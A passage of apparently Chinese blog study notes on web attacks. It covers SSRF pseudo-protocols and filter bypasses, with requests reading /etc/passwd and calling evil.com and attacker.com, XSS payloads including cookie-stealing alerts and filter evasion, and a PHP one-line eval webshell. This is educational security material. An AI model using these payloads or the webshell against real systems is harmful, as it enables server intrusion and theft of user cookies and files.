class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><blockquote><p>一般情况下PHP不会开启fopen的gopher wrapper<br>file_get_contents的gopher协议不能URL编码<br>file_get_contents关于Gopher的302跳转会出现bug，导致利用失败<br>curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用<br>curl_exec() 默认不跟踪跳转，<br>file_get_contents() file_get_contents支持php://input协议</p></blockquote><h2 id="SSRF在URL的伪协议"><a href="#SSRF在URL的伪协议" class="headerlink" title="SSRF在URL的伪协议"></a>SSRF在URL的伪协议</h2><ul><li>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">/// 从文件系统中获取文件内容，如，file:///etc/passwd</span></span><br><span class="line">dict:<span class="comment">// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：</span></span><br><span class="line">sftp:<span class="comment">// SSH文件传输协议或安全文件传输协议</span></span><br><span class="line">ldap:<span class="comment">// 轻量级目录访问协议</span></span><br><span class="line">tftp:<span class="comment">// 简单文件传输协议</span></span><br><span class="line">gopher:<span class="comment">// 分布式文档传递服务，可使用gopherus生成payload</span></span><br></pre></td></tr></table></figure><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><ul><li>可以尝试从文件系统中获取文件：</li></ul><blockquote><p><a href="http://example.com/ssrf.php?url=file:///etc/passwd">http://example.com/ssrf.php?url=file:///etc/passwd</a><br><a href="http://example.com/ssrf.php?url=file:///C:/Windows/win.ini">http://example.com/ssrf.php?url=file:///C:/Windows/win.ini</a></p></blockquote><h3 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h3><ul><li>能够引用允许通过DICT协议使用的定义或单词列表：</li></ul><blockquote><p><a href="http://example.com/ssrf.php?dict://evil.com:1337/">http://example.com/ssrf.php?dict://evil.com:1337/</a><br>evil.com:$ nc -lvp 1337<br>Connection from [192.168.0.12] port 1337[tcp/*]<br>accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</p></blockquote><h3 id="sftp"><a href="#sftp" class="headerlink" title="sftp"></a>sftp</h3><ul><li>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</li></ul><blockquote><p><a href="http://example.com/ssrf.php?url=sftp://evil.com:1337/">http://example.com/ssrf.php?url=sftp://evil.com:1337/</a><br>evil.com:$ nc -lvp 1337<br>Connection from [192.168.0.12] port 1337[tcp/*]<br>accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</p></blockquote><h3 id="ldap-或ldaps-或ldapi"><a href="#ldap-或ldaps-或ldapi" class="headerlink" title="ldap://或ldaps://或ldapi://"></a>ldap://或ldaps://或ldapi://</h3><ul><li>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</li></ul><blockquote><p><a href="http://example.com/ssrf.php?url=ldap://localhost:1337/%0Astats%0Aquit">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit</a><br><a href="http://example.com/ssrf.php?url=ldaps://localhost:1337/%0Astats%0Aquit">http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit</a><br><a href="http://example.com/ssrf.php?url=ldapi://localhost:1337/%0Astats%0Aquit">http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</a></p></blockquote><h3 id="tftp"><a href="#tftp" class="headerlink" title="tftp://"></a>tftp://</h3><ul><li>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</li></ul><blockquote><p><a href="http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</a><br>evil.com:# nc -lvup 1337<br>Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</p></blockquote><h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher://"></a>gopher://</h3><ul><li>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</li></ul><blockquote><p><a href="http://example.com/ssrf.php?url=http://attacker.com/gopher.php">http://example.com/ssrf.php?url=http://attacker.com/gopher.php</a> gopher.php (host it on acttacker.com):-<?php header('Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest');?><br>evil.com:# nc -lvp 1337<br>Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest</p></blockquote><h2 id="SSRF绕过方式"><a href="#SSRF绕过方式" class="headerlink" title="SSRF绕过方式"></a>SSRF绕过方式</h2><h3 id="符号绕过"><a href="#符号绕过" class="headerlink" title="@符号绕过"></a>@符号绕过</h3><ul><li>在某地址1后添加@再次添加地址2，浏览器会自动返回地址2数据</li></ul><blockquote><p><a href="http://www.xxx.com@www.kxsy.work/">http://www.xxx.com@www.kxsy.work/</a></p></blockquote><h3 id="IP地址转换"><a href="#IP地址转换" class="headerlink" title="IP地址转换"></a>IP地址转换</h3><ul><li>对内网请求的IP地址进行各进制的编码<br>这个<a href="http://mo.ab126.com/system/2859.html">网址</a>可以进行在线转换</li></ul><blockquote><p>例如：127.0.0.1<br>二进制 = 1111111000000000000000000000001<br>十六进制 = 7F000001<br>十进制 = 2130706433</p></blockquote><h3 id="转换短地址"><a href="#转换短地址" class="headerlink" title="转换短地址"></a>转换短地址</h3><blockquote><p><a href="https://www.985.so/">https://www.985.so/</a><br>例：<a href="http://www.kxsy.work/">http://www.kxsy.work/</a> = <a href="http://u6.gg/ks69x">http://u6.gg/ks69x</a></p></blockquote><h3 id="特殊符号替换绕过"><a href="#特殊符号替换绕过" class="headerlink" title="特殊符号替换绕过"></a>特殊符号替换绕过</h3><blockquote><p>例：<br><a href="http://www.kxsy.work/">http://www.kxsy.work/</a> = <a href="http://www.kxsy.work/">http://www。kxsy。work/</a><br>localhost或者0.0.0.0</p></blockquote><h3 id="利用句号绕过"><a href="#利用句号绕过" class="headerlink" title="利用句号绕过"></a>利用句号绕过</h3><blockquote><p><a href="http://baidu.com/?url=http://192%E3%80%82168%E3%80%8210%E3%80%82150">http://baidu.com/?url=http://192。168。10。150</a></p></blockquote><h3 id="添加端口绕过"><a href="#添加端口绕过" class="headerlink" title="添加端口绕过"></a>添加端口绕过</h3><blockquote><p><a href="http://baidu.com/?url=http://google.com:443">http://baidu.com/?url=http://google.com:443</a></p></blockquote><h3 id="利用-绕过"><a href="#利用-绕过" class="headerlink" title="利用[::]绕过"></a>利用[::]绕过</h3><blockquote><p><a href="http://baidu.com/?url=http://%5B::192.168.10.150%5D">http://baidu.com/?url=http://[::192.168.10.150]</a></p></blockquote><h3 id="302跳转绕过"><a href="#302跳转绕过" class="headerlink" title="302跳转绕过"></a>302跳转绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$schema</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"><span class="variable">$ip</span>     = <span class="variable">$_GET</span>[<span class="string">&#x27;i&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span>   = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="variable">$query</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$port</span>))&#123;  </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$schema</span>://<span class="subst">$ip</span>/<span class="subst">$query</span>&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">$schema</span>://<span class="subst">$ip</span>:<span class="subst">$port</span>/<span class="subst">$query</span>&quot;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="xip-io绕过：会将解析到子域"><a href="#xip-io绕过：会将解析到子域" class="headerlink" title="xip.io绕过：会将解析到子域"></a>xip.io绕过：会将解析到子域</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//10.0.0.1.xip.io = 10.0.0.1</span></span><br><span class="line">www.<span class="number">10.0</span>.<span class="number">0.1</span>.xip.io= <span class="number">10.0</span>.<span class="number">0.1</span></span><br><span class="line">http:<span class="comment">//mysite.10.0.0.1.xip.io = 10.0.0.1</span></span><br><span class="line">foo.http:<span class="comment">//bar.10.0.0.1.xip.io = 10.0.0.1</span></span><br><span class="line"><span class="number">10.0</span>.<span class="number">0.1</span>.xip.name resolves to <span class="number">10.0</span>.<span class="number">0.1</span></span><br><span class="line">www.<span class="number">10.0</span>.<span class="number">0.2</span>.xip.name resolves to <span class="number">10.0</span>.<span class="number">0.2</span></span><br><span class="line">foo.<span class="number">10.0</span>.<span class="number">0.3</span>.xip.name resolves to <span class="number">10.0</span>.<span class="number">0.3</span></span><br><span class="line">bar.baz.<span class="number">10.0</span>.<span class="number">0.4</span>.xip.name resolves to <span class="number">10.0</span>.<span class="number">0.4</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/post/fe1aa8c3.html"/>
      <url>/post/fe1aa8c3.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="XSS攻击概述"><a href="#XSS攻击概述" class="headerlink" title="XSS攻击概述"></a>XSS攻击概述</h1><ul><li>跨站脚本攻击XSS(Cross Site Scripting)<br>恶意攻击者往 Web 页面里插入恶意 Script 代码，当用户浏览该页面时，嵌入 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。<br>XSS 攻击针对的是用户层面的攻击！</li></ul><h1 id="XSS攻击原理"><a href="#XSS攻击原理" class="headerlink" title="XSS攻击原理"></a>XSS攻击原理</h1><ul><li><p>HTML 是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号（&lt;）被看作是 HTML 标签的开始，之间的字符是页面的标题等等。当动态页面中插入的内容含有这些特殊字符（如&lt;）时，用户浏览器会将其误认为是插入了 HTML 标签，当这些 HTML 标签引入了一段 JavaScript 脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生 XSS 漏洞。</p></li><li><p>所有标签的 &gt; 都可以用 // 代替， 例如 <code>&lt;script&gt;alert(1)&lt;/script//</code></p></li></ul><h1 id="XSS攻击载荷"><a href="#XSS攻击载荷" class="headerlink" title="XSS攻击载荷"></a>XSS攻击载荷</h1><ol><li>script标签</li></ol><blockquote><p> <code>&lt;script&gt;</code>标签是最直接XSS，脚本标记可以引用外部的JavaScript代码，也可以将代码插入脚本标记中</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;hack&quot;</span>)&lt;/script&gt;   #弹出hack</span><br><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="regexp">/hack/</span>)&lt;/script&gt;   #弹出hack</span><br><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;        #弹出<span class="number">1</span>，对于数字可以不用引号</span><br><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)&lt;/script&gt;      #弹出cookie</span><br><span class="line">&lt;script src=<span class="attr">http</span>:<span class="comment">//xxx.com/xss.js&gt;&lt;/script&gt;  #引用外部的xss</span></span><br></pre></td></tr></table></figure><ol start="2"><li>svg标签</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;alert(1)&quot;</span>//</span></span></span><br></pre></td></tr></table></figure><ol start="3"><li>img标签</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="title function_">alert</span>(<span class="string">&quot;hack&quot;</span>)&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span>  <span class="attr">src</span>=<span class="string">1</span>  <span class="attr">οnerrοr</span>=<span class="string">alert(document.cookie)</span>&gt;</span>  #弹出cookie</span></span><br></pre></td></tr></table></figure><ol start="4"><li>body标签</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body οnlοad=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span> <span class="attr">οnpageshοw</span>=<span class="string">alert(1)</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ol start="5"><li>video标签</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video οnlοadstart=<span class="title function_">alert</span>(<span class="number">1</span>) src=<span class="string">&quot;/media/hack-the-planet.mp4&quot;</span> /&gt;</span><br></pre></td></tr></table></figure><ol start="6"><li>style标签</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style οnlοad=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;&lt;/style&gt;</span><br></pre></td></tr></table></figure><h1 id="XSS可以插在哪里"><a href="#XSS可以插在哪里" class="headerlink" title="XSS可以插在哪里"></a>XSS可以插在哪里</h1><ol><li>用户输入作为script标签内容</li><li>用户输入作为HTML注释内容</li><li>用户输入作为HTML标签的属性名</li><li>用户输入作为HTML标签的属性值</li><li>用户输入作为HTML标签的名字</li><li>直接插入到CSS里</li><li>最重要的是，千万不要引入任何不可信的第三方JavaScript到页面里</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#用户输入作为<span class="variable constant_">HTML</span>注释内容，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;!-- 用户输入 --&gt;</span><br><span class="line">&lt;!-- --&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;hack&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>&lt;!-- --&gt;</span><br><span class="line"></span><br><span class="line">#用户输入作为标签属性名，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;div 用户输入=<span class="string">&quot;xx&quot;</span>&gt;  &lt;/div&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;hack&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">a</span>=<span class="string">&quot;xx&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">#用户输入作为标签属性值，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;div id=<span class="string">&quot;用户输入&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;hack&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">a</span>=<span class="string">&quot;x&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">#用户输入作为标签名，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;用户输入  id=<span class="string">&quot;xx&quot;</span> /&gt;</span><br><span class="line">&lt;&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;b id=&quot;xx&quot; /&gt;</span><br><span class="line"></span><br><span class="line">#用户输入作为CSS内容，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;style&gt;用户输入&lt;style&gt;</span><br><span class="line">&lt;style&gt; &lt;/style&gt;&lt;script&gt;alert(&#x27;hack&#x27;)&lt;/script&gt;&lt;style&gt; &lt;/style&gt;</span><br></pre></td></tr></table></figure><h1 id="XSS攻击的分类"><a href="#XSS攻击的分类" class="headerlink" title="XSS攻击的分类"></a>XSS攻击的分类</h1><ul><li>XSS分为：存储型、反射型、DOM型</li></ul><ol><li>存储型XSS：持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将存储到服务器中，用户访问该页面的时候出发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie</li><li>反射型XSS：非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在web页面。反射型XSS大多数是用来盗取用户的Cookie信息</li><li>DOM型XSS：不经过后端，DOM-XSS漏洞是基于文档对象模型（DOM）的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射性XSS</li></ol><h1 id="XSS的简单过滤和绕过"><a href="#XSS的简单过滤和绕过" class="headerlink" title="XSS的简单过滤和绕过"></a>XSS的简单过滤和绕过</h1><h2 id="区分大小写过滤标签"><a href="#区分大小写过滤标签" class="headerlink" title="区分大小写过滤标签"></a>区分大小写过滤标签</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//前端 1.html：</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>反射型XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;action4.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//后端 action4.php：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">$name=$_POST[&quot;name&quot;]; </span></span><br><span class="line"><span class="meta">if($name!=null)&#123;</span></span><br><span class="line"><span class="meta">$name=preg_replace(&quot;/&lt;script&gt;/&quot;,&quot;&quot;,$name);      //过滤&lt;script&gt;</span></span><br><span class="line"><span class="meta">$name=preg_replace(&quot;/&lt;\/script&gt;/&quot;,&quot;&quot;,$name);   //过滤&lt;/script&gt;</span></span><br><span class="line"><span class="meta">echo $name; </span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> 绕过技巧：可以使用大小写绕过  <code>&lt;scripT&gt;alert(&#39;hack&#39;)&lt;/scripT&gt;</code></p><h2 id="不区分大小写过滤标签"><a href="#不区分大小写过滤标签" class="headerlink" title="不区分大小写过滤标签"></a>不区分大小写过滤标签</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/&lt;script&gt;/i&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$name</span>);    <span class="comment">//不区分大小写过滤 &lt;script&gt;</span></span><br><span class="line"><span class="variable">$name</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/&lt;\/script&gt;/i&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$name</span>);  <span class="comment">//不区分大小写过滤 &lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>绕过技巧：可以使用嵌套的script标签绕过<code>&lt;scr&lt;script&gt;ipt&gt;alert(&#39;hack&#39;)&lt;/scr&lt;/script&gt;ipt&gt;</code></p><h2 id="不区分大小写，过滤之间的所有内容"><a href="#不区分大小写，过滤之间的所有内容" class="headerlink" title="不区分大小写，过滤之间的所有内容"></a>不区分大小写，过滤之间的所有内容</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] ); <span class="comment">//过滤了&lt;script  及其之间的所有内容</span></span><br></pre></td></tr></table></figure><p>虽然无法使用<code>&lt;script&gt;</code>标签注入XSS代码，但是可以通过img、body等标签的事件或者 iframe 等标签的 src 注入恶意的 js 代码。</p><p><code>payload： &lt;img src=1 οnerrοr=alert(&#39;hack&#39;)&gt;</code></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/post/592e5fba.html"/>
      <url>/post/592e5fba.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="WebShell与WebShell管理工具"><a href="#WebShell与WebShell管理工具" class="headerlink" title="WebShell与WebShell管理工具"></a>WebShell与WebShell管理工具</h1><h2 id="什么叫做WebShell"><a href="#什么叫做WebShell" class="headerlink" title="什么叫做WebShell"></a>什么叫做WebShell</h2><ul><li>WebShell，简称网页后门。运行在<code>Web应用之上的远程控制程序</code> </li><li>webshell其实就是<code>一张网页</code>，由<code>PHP、JSP、ASP、ASP.NE</code>T等web语言开发，但并不具备常见网页的功能，例如登陆、注册、信息展示等功能，一般会具备文件管理、端口扫描、提权、获取系统信息等功能</li></ul><h2 id="常见的WebShell有哪些"><a href="#常见的WebShell有哪些" class="headerlink" title="常见的WebShell有哪些"></a>常见的WebShell有哪些</h2><ul><li>大马、小马、各种马等</li><li>拥有完整功能的webshell，我们一般称为<code>大马</code></li><li>功能简易的webshell称为<code>小马</code></li><li>除此之外还有<code>一句话木马、不死马、脱库马</code>等等，是对webshell功能或者特性的简称</li></ul><h2 id="WebShell有什么作用呢"><a href="#WebShell有什么作用呢" class="headerlink" title="WebShell有什么作用呢"></a>WebShell有什么作用呢</h2><p><strong>大马有什么作用呢</strong></p><ul><li>上传大马后，可以通过大马来获取目标主机的控制权限、对内网进行扫描、获取内部系统的信息、盗取数据库等一系列操作</li></ul><p><strong>一句话木马解读</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[x]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>$_POST[x]</code>: 获取<code>POST</code>请求参数中x的值。例如<code>POST</code>请求中传递<code>x=phpinfo();</code>，那么<code>$_POST[x]</code>就等同于<code>phpinfo();</code></li><li><code>eval()</code>将字符串当作PHP代码去执行。例如<code>eval(&#39;phpinfo();&#39;)</code>，其中<code>phpinfo();</code>会被当做PHP代码去执行。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[x]); <span class="meta">?&gt;</span>   实际上的传递过程是这样的</span><br><span class="line">↓</span><br><span class="line">↓</span><br><span class="line">↓</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="meta">?&gt;</span> 实际的语句是这样的 </span><br></pre></td></tr></table></figure><ul><li>我们通过该<code>webshell</code>，传递<code>任意PHP代码</code>，让其去执行，从而达到<code>任意代码执行</code>。</li><li>错误控制运算符，当将 <code>@</code>放置在一个PHP表达式之前，该表达式可能产生的任何错误信息都被 <code>忽略</code>掉。</li></ul><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p><strong>什么是文件上传漏洞</strong></p><ul><li>文件上传漏洞是指文件上传功能<code>没有对上传的文件做合理严谨的过滤</code>，导致用户可以利用此功能，上传能<code>被服务端解析执行的文件</code>，并通过此文件获得<code>执行服务端命令的能力</code>。</li></ul><h2 id="客户端JavaScript检测"><a href="#客户端JavaScript检测" class="headerlink" title="客户端JavaScript检测"></a>客户端JavaScript检测</h2><ul><li>如果上传非法文件，返回结果很快，或者F12打开开发者模式，上传非法文件，发现没有网络请求，但是被拦截了，很有可能就是客户端进行了JS校验检测。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span 